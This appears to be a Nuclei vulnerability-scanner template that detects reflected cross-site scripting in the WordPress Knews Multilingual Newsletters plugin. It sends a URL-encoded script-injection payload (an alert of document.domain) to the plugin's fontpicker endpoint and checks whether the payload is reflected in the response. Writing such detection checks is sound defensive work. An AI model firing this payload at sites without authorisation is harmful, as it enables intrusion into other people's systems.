id: wp-knews-xss
info:
  author: daffainfo
  name: WordPress Plugin Knews Multilingual Newsletters - Reflected Cross-Site Scripting
    (XSS)
  reference:
  - https://www.securityfocus.com/bid/54330/info
  severity: medium
  tags: wordpress,xss,wp-plugin
requests:
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/knews/wysiwyg/fontpicker/?ff=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
